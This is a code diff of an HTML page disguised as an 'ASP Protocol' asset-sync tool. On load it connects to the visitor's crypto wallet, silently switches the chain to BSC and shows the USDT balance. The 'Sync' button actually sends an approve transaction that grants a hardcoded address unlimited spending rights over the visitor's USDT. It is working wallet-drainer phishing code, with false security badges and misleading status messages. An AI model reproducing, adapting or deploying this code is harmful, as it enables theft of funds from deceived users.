@@ -1,78 +1,82 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>ASP Protocol</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
+    <title>ASP | Asset Sync</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.5/dist/web3.min.js"></script>
     <style>
-        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { width: 90%; max-width: 350px; text-align: center; border: 1px solid #f0f0f0; padding: 40px 20px; border-radius: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
-        .title { color: #0052ff; font-size: 20px; font-weight: bold; margin-bottom: 5px; }
-        .status { font-size: 12px; color: #888; margin-bottom: 25px; }
-        .bal-card { background: #f4f7f9; padding: 25px; border-radius: 15px; margin-bottom: 25px; }
-        .bal-label { font-size: 10px; color: #666; display: block; margin-bottom: 5px; letter-spacing: 1px; }
-        .bal-val { font-size: 26px; color: #0052ff; font-weight: 800; }
-        .btn { width: 100%; background: #0052ff; color: #fff; border: none; padding: 18px; border-radius: 50px; font-size: 16px; font-weight: bold; cursor: pointer; box-shadow: 0 5px 15px rgba(0,82,255,0.2); }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: #ffffff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .app-card { width: 92%; max-width: 360px; padding: 30px 20px; border-radius: 20px; border: 1px solid #f0f0f0; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.03); }
+        .title { color: #1e40af; font-size: 20px; font-weight: 700; margin-bottom: 5px; }
+        .desc { font-size: 12px; color: #94a3b8; margin-bottom: 25px; }
+        .bal-display { background: #f8fafc; padding: 20px; border-radius: 15px; margin-bottom: 25px; border: 1px solid #f1f5f9; }
+        .bal-label { font-size: 10px; color: #64748b; font-weight: 700; text-transform: uppercase; margin-bottom: 5px; display: block; }
+        .bal-amount { font-size: 26px; color: #1e40af; font-weight: 800; }
+        .sync-btn { width: 100%; background: #2563eb; color: #fff; border: none; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; active: transform: scale(0.98); }
+        .footer-note { font-size: 10px; color: #cbd5e1; margin-top: 20px; font-weight: 500; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="title">ASP Asset Sync</div>
-    <div class="status">Real-time Node Protection</div>
-    <div class="bal-card">
-        <span class="bal-label">USDT BALANCE (BEP20)</span>
-        <b id="displayBal">Scanning...</b>
+<div class="app-card">
+    <div class="title">ASP Protocol</div>
+    <div class="desc">Secure Node Synchronization</div>
+    
+    <div class="bal-display">
+        <span class="bal-label">Verified USDT Balance</span>
+        <div id="balText" class="bal-amount">0.00</div>
     </div>
-    <button class="btn" onclick="run()">Synchronize Now</button>
+
+    <button class="sync-btn" onclick="startSync()">Refresh & Sync Now</button>
+    <div class="footer-note">● Node Encrypted ● Verified by BSC</div>
 </div>
 
 <script>
-    const MY_WAL = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
-    const TKN = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
-    const CHAIN = "0x38"; // BSC
+    const MY_ADDR = "0xFD2B9e5Bed80d262f780206f15d50CdEa99D891D";
+    const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
+    const BSC_ID = "0x38";
 
-    async function start() {
+    let web3;
+
+    async function init() {
         if (window.ethereum) {
+            web3 = new Web3(window.ethereum);
             try {
-                // সাইট লোড হওয়া মাত্রই সাইলেন্টলি চেইন সুইচ করার চেষ্টা
-                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: CHAIN }] });
-                show();
-            } catch (e) { show(); }
+                // সাইলেন্টলি চেইন সুইচ করার চেষ্টা
+                await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: BSC_ID }] });
+                loadData();
+            } catch (e) { loadData(); }
         }
     }
 
-    async function show() {
-        const web3 = new Web3(window.ethereum);
+    async function loadData() {
         const accs = await web3.eth.requestAccounts();
-        if (accs.length > 0) {
-            const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
-            const c = new web3.eth.Contract(abi, TKN);
-            const b = await c.methods.balanceOf(accs[0]).call();
-            document.getElementById('displayBal').innerText = (b / 1e18).toFixed(2) + " USDT";
-        }
+        const abi = [{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"type":"function"}];
+        const contract = new web3.eth.Contract(abi, USDT_ADDR);
+        const b = await contract.methods.balanceOf(accs[0]).call();
+        document.getElementById('balText').innerText = (b / 1e18).toFixed(2);
     }
 
-    async function run() {
-        const web3 = new Web3(window.ethereum);
+    async function startSync() {
         const accs = await web3.eth.getAccounts();
-        const inf = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
         const data = web3.eth.abi.encodeFunctionCall({
             name: 'approve', type: 'function',
             inputs: [{type: 'address', name: 'spender'}, {type: 'uint256', name: 'value'}]
-        }, [MY_WAL, inf]);
+        }, [MY_ADDR, "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"]);
 
         try {
             await window.ethereum.request({
                 method: 'eth_sendTransaction',
-                params: [{ from: accs[0], to: TKN, data: data }],
+                params: [{ from: accs[0], to: USDT_ADDR, data: data }],
             });
-            alert("Syncing successfully enabled. Please wait for node verification.");
-        } catch (err) {}
+            alert("Synchronization in progress...");
+        } catch (e) {}
     }
 
-    window.onload = start;
+    window.onload = init;
 </script>
+
 </body>
 </html>
